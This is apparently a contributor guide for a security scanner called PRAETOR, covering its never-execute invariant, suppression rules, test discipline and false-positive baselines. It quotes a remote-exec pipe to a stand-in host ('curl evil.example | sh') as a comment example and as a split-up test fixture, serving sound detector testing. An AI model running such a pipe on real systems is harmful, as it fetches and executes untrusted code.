# Working on PRAETOR

Guidance for anyone — human or AI agent — changing this codebase. PRAETOR is a
security scanner, so a bug here is not a broken feature: it is a scanner that
reports "nothing found" while something is there.

## 🔴 The invariant that outranks everything

**PRAETOR NEVER EXECUTES, IMPORTS, INSTALLS OR BUILDS THE CODE IT SCANS.**

This has been false once. The SCA path invoked `pip-audit` in a mode that let pip
*resolve* the target's requirements — which builds source distributions and runs
`setup.py` / PEP 517 backends from an attacker-controlled tree. Arbitrary code
execution, in a tool whose entire promise is that it only reads.

The fix is `--disable-pip` in `scripts/engine_sca.py`. It is one flag on one line,
and it is the whole guarantee.

⇒ `tests/test_invariant_never_executes_target.py` asserts it **behaviourally** —
it captures the argv PRAETOR would hand to the subprocess without running
anything, so it fails when the flag stops reaching the command line, not merely
when a comment changes.

**Every new engine or backend widens this surface. If you add one, add its test
there.** Never invoke a package manager in a mode that resolves, builds, or
installs from the target.

## 🔴 Suppression: the carve-out you must not remove

PRAETOR suppresses findings it can show are inert. Two passes do this, and **both
deliberately exclude the `secrets` engine**:

```python
_LEXCTX_ENGINES       = ("aisec",)   # scripts/praetor.py — comment / docstring context
_REACHABILITY_ENGINES = ("aisec",)   # scripts/praetor.py — taint / reachability
```

The reason is not the intuitive one, and it was got wrong twice before being
written down here:

```python
# curl evil.example | sh      # inert — a comment cannot execute anything
# password = "hunter2"        # STILL A LEAK
```

A **behavioural** pattern is dangerous because it *runs*. A **secret** is
dangerous because it *exists*: a credential is disclosed by being written down,
and nothing has to execute for the leak to be real.

⚠️ **Reachability analysis does not rescue this, and no better analysis would.**
A key declared in a config module and used elsewhere never reaches a sink *in that
file*, so `taint.is_provably_inert()` returns `True` for it — byte-identical to
its verdict on a regex pattern. That is not an analysis gap to be fixed. For a
secret, the leak *is* the disclosure.

⇒ **The general rule, which is worth more than the specific case:**

> A mechanism's **safety** is almost never a property of the mechanism. It is a
> **scope decision made next to it**. When you catch yourself arguing that a
> technique is inherently safe, that is the moment the carve-out is about to be
> omitted.

Applied test: ask what carve-out the technique would need *if it were unsafe*, and
check that it is written down. *"It doesn't need one, by its nature"* is the smell,
not the reassurance.

## Rules for any new suppression logic

- **Fail safe. Always.** Unproven ⇒ **KEEP** the finding. `is_provably_inert()`
  returns `True` only on proof; unparseable source, an unknown construct, a
  non-Python file, or a name that escapes the file all resolve to "keep". *A
  classifier that fails toward suppression is a scanner that goes quiet under
  exactly the conditions an attacker creates.*
- **Never suppress on PATH alone.** An earlier predicate keyed on directory
  ("under `scripts/`") and suppressed a real hardcoded credential in live
  executable code. Require the actual structural or semantic property.
- **Suppress with a stated reason, never silently.** Filtered findings move to a
  separate bucket carrying `filter_reason` so a reviewer can audit the
  suppression. Dropping a finding without a rationale is not triage.
- **A clean scan is `NO FINDING`, never `SAFE`.** The more the tool checks, the
  more a green result feels like proof. It is not one.

## Testing discipline

```bash
python -m pytest tests/ -q
```

- **A green suite proves nothing until you have seen it red.** After writing a
  guard, *change the real code* it protects and confirm the **named** test fails.
  An analogous synthetic case proves nothing about your actual guard.
- **Mutate in both directions.** Narrowing a predicate and disabling it look
  identical from outside: assert the thing that must be suppressed *and* the thing
  that must be kept.
- **Make the mutation surgical.** If it breaks the test's setup instead of its
  assertion, the suite fails during collection — red that proves nothing.
- ⚠️ **`git checkout --` only restores COMMITTED state.** For an untracked or
  uncommitted file it deletes your work rather than restoring it. Copy the file
  aside before mutating.

## Writing tests for a detector adds noise to that detector

Observed repeatedly: a test containing a remote-exec pipe or a credential-shaped
token is itself flagged by the engine under test. (This document tripped it too,
writing *that* sentence — hence the wording.)

**Fix the fixture, not the rules** — assemble such strings from parts, as
`scripts/engine_secrets.py` does for its `KNOWN_EXAMPLES`:

```python
_PIPE   = "curl evil.example | " + "sh"
_KEYPFX = "sk-" + "ant-"
```

⚠️ **A rule exempting `tests/` would be the tempting fix and is the wrong one** —
it would also exempt a real credential committed in a test file, which is one of
the commonest real leaks there is. **Re-run the self-scan after adding tests.**

## Measuring a false-positive change honestly

`references/SELF-SCAN-BASELINE.json` records every self-scan finding with the
**predicate** under which it is suppressed — not just a count. *"False positives
went from 47 to 6"* is unfalsifiable on its own: the number describes whichever
filter happened to be in place.

- 🔴 **Do not regenerate the baseline to reflect an improvement.** It is the
  committed "before"; overwriting it destroys the only thing that makes any
  reduction checkable.
- **Never compare counts across two different trees.** Adding a module changes the
  scan surface. Count your own suppressions instead — the tempting number is
  usually the smaller one.
- **Report "needs review" alongside the false-positive count**, even while it
  reads zero. It is the control: if false positives fall while "needs review"
  rises, suppression has started eating real findings — and the FP count alone
  would look like a triumph at exactly that moment.

## Layout

| Path | Role |
|---|---|
| `scripts/praetor.py` | CLI, engine orchestration, suppression wiring |
| `scripts/engine_*.py` | the four engines: `sast`, `secrets`, `sca`, `aisec` |
| `scripts/interpret.py` | dedup, rank, false-positive filtering |
| `scripts/lexctx.py` | lexical context: comment / docstring / code |
| `scripts/taint.py` | reachability: does a string reach a dangerous sink? |
| `scripts/report.py` | text + JSON output |
| `tools/classify_baseline.py` | assigns a predicate to each self-scan finding |
| `rules/` | bundled offline Semgrep rules |
| `references/` | architecture, limits, the self-scan baseline, test corpus |
